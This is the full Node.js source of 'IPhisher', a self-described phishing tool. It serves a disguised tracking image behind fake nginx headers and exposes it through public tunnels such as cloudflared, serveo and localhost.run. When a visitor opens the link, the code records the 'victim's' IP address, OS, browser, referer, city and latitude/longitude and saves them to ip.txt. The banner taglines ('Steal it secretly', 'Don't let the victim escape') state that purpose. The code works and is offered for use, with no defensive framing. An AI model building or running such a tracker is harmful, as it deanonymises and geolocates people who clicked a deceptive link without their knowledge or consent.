const { spawn, execSync, spawnSync } = require('child_process')
const fs = require('fs')
const path = require('path')

function system(command) {
  return execSync(command, { stdio: 'inherit', shell: process.env.SHELL, env: process.env })
}

const isWindows = process.platform === 'win32'
const isMac = process.platform === 'darwin'
const isLinux = process.platform === 'linux'
const isTermux = (isLinux && fs.existsSync('/data/data/com.termux')) || process.env.TERMUX_VERSION || process.platform === 'android'

const haveWget = spawnSync('wget', ['-V']).status === 0
const haveCurl = spawnSync('curl', ['--version']).status === 0
const haveSSH  = spawnSync('ssh', ['-V']).status === 0

if (!(haveWget || haveCurl)) {
  console.log('Please install wget or curl')
  process.exit(1)
}

const baseDownloadURL = 'https://raw.githubusercontent.com/gamerboytr/IPhisher/master'

if (!fs.existsSync(path.resolve(__dirname, 'package.json'))) { // Direct run
  console.log('Preparing for direct run...')
  system(`${haveWget ? 'wget -q' : 'curl -O'} ${baseDownloadURL}/package.json`)
}

if (!fs.existsSync(path.resolve(__dirname, 'node_modules'))) {
  system(isWindows ? 'cls' : 'clear')
  console.log('Installing dependencies...');
  let pm = 'npm'
  try {
    execSync('yarn --version', { stdio: 'ignore' })
    pm = 'yarn'
  } catch {}
  try {
    execSync(`pnpm --version`, { stdio: 'ignore' })
    pm = 'pnpm'
  } catch {}
  try { system(`${pm} install`) }
  catch (e) {
    console.log(e)
    console.log(`Failed to install dependencies with ${pm}, please install manually`)
    fs.unlinkSync(path.resolve(__dirname, 'node_modules'))
    process.exit(1)
  }
  console.log(`Used package manager: ${pm}`)
  console.log("Installed all dependencies.")
}

if (!haveSSH) {
  if (isWindows) {
    console.log('Please install OpenSSH manually')
    process.exit(1)
  }
  console.log('Installing OpenSSH...')
  system(`${isTermux ? 'pkg' : 'sudo apt'} install openssh${!isTermux ? '-client' : ''}`)
}

const cliProgress = require("cli-progress")
const uaParser = require('ua-parser-js')
const axios = require('axios').default
const prompts = require('prompts')
const express = require('express')
const yargs = require('yargs')
const chalk = require('chalk')
const util = require('util')
const exec = util.promisify(require('child_process').exec)

const symbol = {
  success: t => chalk.bold.greenBright(`[${chalk.whiteBright('√')}]`, t),
  error: t => chalk.bold.redBright(`[${chalk.whiteBright('!')}]`, t),
  info: (t, v) => chalk.bold.blueBright(`[${chalk.whiteBright(v ? '•' : '+')}]`, t),
  warning: t => chalk.bold.yellowBright(`[${chalk.whiteBright('!')}]`, t),
}

const arch = process.arch === 'x64' ? 'amd64' : process.arch === 'arm64' ? 'arm64' : process.arch === 'arm' ? 'arm' : '386'

const VERSION_complete = JSON.parse(fs.readFileSync(path.resolve(__dirname, 'package.json'))).version
const VERSION = VERSION_complete.replace(/.[0-9]+$/, '')

// Yargs
const args = yargs
  .scriptName('index.js')
  .usage('Usage: node $0 [-h] [-p PORT] [--path PATH]')
  .version(VERSION_complete)
  .option('p', {
    alias: 'port',
    default: 3000,
    describe: 'Port to run on',
    type: 'number',
  })
  .option('path', {
    default: '/image.png',
    describe: 'Fake image path on server',
    type: 'string',
  })
  .help()
  .alias('h', 'help')
  .recommendCommands()
  .wrap(null)
  .parse()

const titleTexts = [
  'Phish like a chameleon',
  'Be like a chameleon',
  'Don\'t let the victim escape',
  'Steal it secretly',
  'github.com/gamerboytr'
]

const logo = chalk.bold.red`  _____  ___ _     _     _
  \\_   \\/ _ \\ |__ (_)___| |__   ___ _ __
   / /\\/ /_)/ '_ \\| / __| '_ \\ / _ \\ '__|
{white /\\/ /_/ ___/| | | | \\__ \\ | | |  __/ |
\\____/\\/    |_| |_|_|___/_| |_|\\___|_| {cyan [v${VERSION}]}}

${' '.repeat(6)}{bgRedBright.white   ${titleTexts[Math.floor(Math.random() * titleTexts.length)]}  }

${' '.repeat(6)}[{white ::}] Tool created by {underline XielQ} [{white ::}]
`

system(isWindows ? 'cls' : 'clear')
try { // Try cuz some terminals don't support stty
  if (!isWindows) {
    system('stty -echoctl') // Hide ^C
    system('echo -en "\\e]2;XielQ IPhisher\\a"') // some node issues lol
  }
} catch {}
process.title = 'XielQ IPhisher'
console.log(logo)

process.on("SIGINT", () => {
  console.log('\n' + symbol.info('Thanks for using IPhisher!\n'))
  process.exit(0)
})

const app = express()
const loggedIPs = []
let   tunnelStr = ''
app.disable('x-powered-by')
app.set('trust proxy', true)
app.set('etag', false)
app.use(express.json())
app.use(express.urlencoded({ extended: true }))

/**
 * @param {import('express').Request} req 
 * @param {import('express').Response} res
 * @param {import('express').NextFunction} next
 */
async function handleRequest(req, res, next) {
  res.set('Server', 'nginx/1.23.4') // Fake nginx server
  if (['localhost', '127.0.0.1'].includes(req.hostname)) return res.send('<h1>Direct access not allowed, use a tunnel link instead</h1>')
  next()
  // Logging
  const ip = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress
  if (loggedIPs.includes(ip) || ip === '::1' || ip === '::ffff:127.0.0.1') return
  loggedIPs.push(ip)
  const userAgent = req.headers['user-agent']
  const ua = uaParser(userAgent)
  const referer = req.headers.referer
  
  const IPInfo = await axios.get(`https://ipwhois.app/json/${ip}`).then(r => r.data)
  
  if (!IPInfo.type) return
  system(isWindows ? 'cls' : 'clear')
  console.log(logo)
  console.log(tunnelStr + '\n')
  console.log(symbol.success('Victim IP found!\n'))

  console.log(symbol.info(`Path                 :  ${chalk.reset.blueBright(decodeURIComponent(req.originalUrl))} ${chalk.reset.gray(`(${req.hostname})`)}`))
  console.log(symbol.info(`IP                   :  ${chalk.reset.blueBright(ip)}`))
  console.log(symbol.info(`IP Type              :  ${chalk.reset.blueBright(IPInfo.type)}`))
  console.log(symbol.info(`User OS              :  ${chalk.reset.blueBright(ua.os?.name ? `${ua.os.name} ${ua.os.version ?? ''}` : 'Unknown')}`))
  console.log(symbol.info(`Browser              :  ${chalk.reset.blueBright(ua.browser?.name ?? 'Unknown')} ${chalk.reset.blueBright(ua.browser.version ? ua.browser.version : '')}`))
  console.log(symbol.info(`Location             :  ${chalk.reset.blueBright(IPInfo?.city ?? 'Unknown')}`))
  console.log(symbol.info(`GeoLocation(lat, lon):  ${chalk.reset.blueBright(IPInfo.latitude + ', ')}${chalk.reset.blueBright(IPInfo.longitude)}`))
  console.log(symbol.info(`Curreny              :  ${chalk.reset.blueBright(IPInfo.currency_code)}`))
  console.log(symbol.info(`Referer              :  ${chalk.reset.blueBright(referer ?? 'No referer')}`))
  console.log(symbol.info(`UserAgent            :  ${chalk.reset.blueBright(userAgent ?? 'No agent')}\n`))

  loggedIPs.push(ip)
  fs.appendFileSync(
    path.resolve(__dirname, 'ip.txt'),
    [
      `========================XielQ IPhisher ${new Date().toLocaleString()}========================`,
      `Path: ${decodeURIComponent(req.originalUrl)} (${req.hostname})`,
      `IP: ${ip}`,
      `IP Type: ${IPInfo.type}`,
      `User OS: ${ua.os?.name ? `${ua.os.name} ${ua.os.version ?? ''}` : 'Unknown'}`,
      `Browser: ${ua.browser?.name ?? 'Unknown'} ${ua.browser.version ? ua.browser.version : ''}`,
      `Location: ${IPInfo?.city ?? 'Unknown'}`,
      `GeoLocation(lat, lon): ${IPInfo.latitude},${IPInfo.longitude}`,
      `Curreny: ${IPInfo.currency_code}`,
      `Referer: ${referer ?? 'No referer'}`,
      `UserAgent: ${userAgent ?? 'No agent'}`,
      '',
    ].join("\n")
  )
  console.log(symbol.info('Saved in ip.txt\n'))
  console.log(symbol.info(`Waiting for next... ${chalk.cyanBright`Press {red Ctrl+C} to exit`}`))  
}

function getFiles(path = 'exposed')  {
  if (!fs.existsSync(path)) return []
  const files = []
  for (const file of fs.readdirSync(path, { withFileTypes: true })) {
    if (file.isDirectory()) files.push(...getFiles(path + '/' + file.name))
    else files.push(path + '/' + file.name)
  }
  return files.map(file => file.replace(/exposed\//g, ''))
}

function makeHumanReadable(bytes) {
  const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']
  let l = 0, n = parseInt(bytes, 10) || 0
  while (n >= 1024 && ++l) n = n / 1024
  return `${n.toFixed(l < 1 ? 0 : 2)} ${units[l]}`
}

async function downloadFile(url, filePath) {
  if (!fs.existsSync(path.dirname(filePath))) fs.mkdirSync(path.dirname(filePath))
  try {
    if (isWindows) throw new Error('Windows') // i'm lazy to make this a function so just throw an error
    system('wget -q --show-progress -O ' + filePath + ' ' + url)
    process.stdout.moveCursor(0, -1)
    process.stdout.clearLine(1) // Clear progress bar
  } catch (e) {
    if (e.message !== 'Windows') console.log(symbol.error('Wget failed, using legacy method...'))
    return await new Promise(async (resolve, reject) => {
      const dp = `${path.basename(path.dirname(filePath))}/${path.basename(filePath)}`
      const progressBar = new cliProgress.SingleBar({ format: chalk.blueBright(`${chalk.bold(dp)} [${chalk.cyanBright('{bar}')}] {percentage}% || ETA: {eta}s || {speed} || {current}/{size}`), clearOnComplete: true, hideCursor: true, barsize: 25 }, cliProgress.Presets.shades_classic)
      const file = fs.createWriteStream(filePath)
      let receivedBytes = 0
      const startTime = Date.now()
      const response = await axios.get(url, { responseType: 'stream' })
      if (response.status < 200 || response.status > 399) return reject(symbol.error(`Response status was ${response.status}`))
      progressBar.start(response.headers['content-length'], 0, { speed: 'N/A', current: '0 KB', size: makeHumanReadable(response.headers['content-length']) })
      response.data.pipe(file)
      response.data.on('data', chunk => {
        receivedBytes += chunk.length
        const elapsedTime = (Date.now() - startTime) / 1000
        let downloadSpeed = file.bytesWritten / elapsedTime / 1024
        if (downloadSpeed < 1024) downloadSpeed = downloadSpeed.toFixed(2) + 'KB/s'
        else downloadSpeed = (downloadSpeed / 1024).toFixed(2) + 'MB/s'
        progressBar.update(receivedBytes, { speed: downloadSpeed, current: makeHumanReadable(file.bytesWritten) })
      })
      response.data.on('error', err => {
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath)
        progressBar.stop()
        reject(symbol.error(err.message))
      })
      file.on("finish", () => {
        progressBar.stop()
        file.close(resolve)
      })
      file.on("error", err => {
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath)
        progressBar.stop()
        reject(symbol.error(err.message))
      })
    })
  }
}

async function createCloudflaredTunnel(port) {
  return await new Promise((resolve, reject) => {
    const tunnel = spawn(path.resolve(__dirname, 'bin', 'cloudflared' + (isWindows ? '.exe' : '')), ['tunnel', '-url', `localhost:${port}`])
    let msg = ''
    tunnel.stdout.on('data', data => msg += data.toString())
    tunnel.stderr.on('data', data => {
      msg += data.toString()
      const match = data.toString().match(/https:\/\/[0-9A-Za-z\-]+.trycloudflare.com/)
      if (match?.[0] === 'https://api.trycloudflare.com' && isTermux) {
        console.log(symbol.error('Please turn on your hotspot to use cloudflared'))
        resolve(false)
      }
      if (match) resolve(match[0])
    })
    tunnel.on('exit', () => reject('Cannot create tunnel: ' + msg.slice(0, 1024) + (msg.length > 1024 ? '...' : '')))
  })
}

async function createLocalhostRunTunnel(port) {
  return await new Promise((resolve, reject) => {
    const tunnel = spawn('ssh', ['-oStrictHostKeyChecking=no', `-oUserKnownHostsFile=/dev/${isWindows ? 'nul' : 'null'}`, '-TnR', `80:localhost:${port}`, 'nokey@localhost.run'])
    let msg = ''
    tunnel.stdout.on('data', data => {
      msg += data.toString()
      const match = data.toString().match(/https:\/\/[A-Za-z0-9]{14}.lhr.life/)
      if (match) resolve(match[0])
    })
    tunnel.on('exit', () => reject('Cannot create localhostrun tunnel: ' + msg.slice(0, 1024) + (msg.length > 1024 ? '...' : '')))
  })
}

async function createServeoTunnel(port) {
  return await new Promise((resolve, reject) => {
    const tunnel = spawn('ssh', ['-oStrictHostKeyChecking=no', `-oUserKnownHostsFile=/dev/${isWindows ? 'nul' : 'null'}`, '-TnR', `80:localhost:${port}`, 'serveo.net'])
    let msg = ''
    tunnel.stdout.on('data', data => {
      msg += data.toString()
      const match = data.toString().match(/https:\/\/[A-Za-z0-9]{32}.serveo.net/)
      if (match) resolve(match[0])
    })
    tunnel.on('exit', () => reject('Cannot create serveo tunnel: ' + msg.slice(0, 1024) + (msg.length > 1024 ? '...' : '')))
  })
}

async function downloadCloudflared(forceDownload = false) {
  const downloadPath = `https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${isWindows ? 'windows' : isMac ? 'darwin' : 'linux'}-${isMac ? 'amd64' : arch}${isWindows ? '.exe' : isMac ? '.tgz' : ''}`
  if (!fs.existsSync(path.resolve(__dirname, 'bin', 'cloudflared' + (isWindows ? '.exe' : ''))) || forceDownload) {
    console.log(symbol.info('Downloading cloudflared...'))
    try {
      await downloadFile(downloadPath, path.resolve(__dirname, 'bin', 'cloudflared' + (isWindows ? '.exe' : isMac ? '.tgz' : '')))
      if (isLinux || isTermux) await exec(`chmod +x ${path.resolve(__dirname, 'bin', 'cloudflared')}`)
    } catch (e) {
      console.log(symbol.error(e))
      console.log(symbol.error('Cannot download cloudflared'))
      return false
    }
    console.log(symbol.info('Downloaded cloudflared'))
    if (isMac) {
      // Extract
      console.log(symbol.info('Extracting...'))
      try {
        await exec(`tar -xzf ${path.resolve(__dirname, 'bin', 'cloudflared.tgz')} -C ${path.resolve(__dirname, 'bin')}`)
        fs.unlinkSync(path.resolve(__dirname, 'bin', 'cloudflared.tgz'))
      } catch (e) {
        console.log(symbol.error(e))
        console.log(symbol.error('Cannot extract cloudflared'))
        return false
      }
    }
  } else {
    try {
      const size = fs.statSync(path.resolve(__dirname, 'bin', 'cloudflared' + (isWindows ? '.exe' : ''))).size
      const response = await axios.head(downloadPath)
      if (response.status !== 200) console.log(symbol.warning('Cannot check cloudflared version'))
      else if (response.headers['content-length'] !== `${size}`) {
        console.log(symbol.warning('Cannot verify cloudflared, redownloading...'))
        return await downloadCloudflared(true)
      }
    } catch (e) {
      console.log(symbol.warning('Cannot check cloudflared version'))
      console.error(e)
    }
  }
  return true
}

async function createTunnels(port, fakePath) {
  const haveCF = await downloadCloudflared()
  try {
    const urls = await Promise.all([
      haveCF ? createCloudflaredTunnel(port) : null,
      createLocalhostRunTunnel(port),
      createServeoTunnel(port),
    ]).then(urls => urls.filter(url => url))
    if (urls.length < 1) {
      console.log(symbol.error('Cannot create tunnels'))
      process.exit(1)
    }
    console.log(symbol.success('Tunnel(s) created'))
    tunnelStr = urls.map(u => symbol.info(u + fakePath, true)).join('\n')
    console.log(tunnelStr)
  } catch (e) {
    console.log(symbol.error(e), '\n' + (e.stack ? e.stack.split('\n').slice(1).join('\n') : ''))
    process.exit(1)
  }
}

app.use(handleRequest)

async function main(defined = false, dPort = 3000, dPath = '/image.png') {
  if (fs.existsSync(path.resolve(__dirname, 'exposed')) && !defined) {
    for (const file of getFiles()) app.use('/' + file, (_, res) => res.sendFile(path.resolve(__dirname, 'exposed', file)))
  }
  let { port, fakePath } = await prompts([
    args.port ? null : {
      type: 'number',
      name: 'port',
      message: chalk.cyan('Port to run on'),
      initial: dPort,
      validate: input => {
        if (input !== '' && (input < 1024 || input > 65535)) return 'Port must be between 1024 and 65535'
        return true
      }
    },
    args.path ? null : {
      type: 'text',
      name: 'fakePath',
      message: chalk.cyan('Fake image path on server'),
      initial: dPath,
      format: input => input.startsWith('/') ? input : '/' + input,
      validate: input => {
        if (getFiles().includes(input.replace(/^\//, ''))) return 'Path already in use'
        return true
      }
    },
  ].filter(a => a))
  port = port ?? args.port
  fakePath = fakePath ?? args.path
  if (!fakePath || !port) {
    console.log(symbol.error('Exiting...'))
    process.exit(1)
  }
  if (port < 1024 || port > 65535) {
    console.log(symbol.error('Port must be between 1024 and 65535'))
    process.exit(1)
  }
  if (getFiles().includes(fakePath.replace(/^\//, ''))) {
    console.log(symbol.error('Path already in use'))
    process.exit(1)
  }
  app.use(fakePath, (req, res) => {
    const imageData = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', 'base64')
    res.header('Content-Type', 'image/png').send(imageData)
  })
  app.use((req, res, _) => {
    res.status(404).send(`<title>404 Not Found</title><center><h1>404 Not Found</h1><hr>nginx</center>`) // Fake nginx error page
  })
  try {
    await new Promise((r,e) => {
      try { app.listen(port, r).on('error', e) }
      catch (err) { e(err) }
    })
  } catch (e) {
    if (e.code === 'EADDRINUSE') {
      console.log(symbol.error(`Port ${port} is already in use`))
      if (args.port) process.exit(1)
    } else {
      console.log(symbol.error(e))
      console.log(symbol.error('Please report this error to https://github.com/gamerboytr/IPhisher/issues'))
      process.exit(1)
    }
    return main(true, port + 1, fakePath)
  }
  console.log(symbol.success(`Server running on port :${port}`))
  console.log(symbol.info('Creating tunnel(s)...'))
  await createTunnels(port, fakePath)
}

main()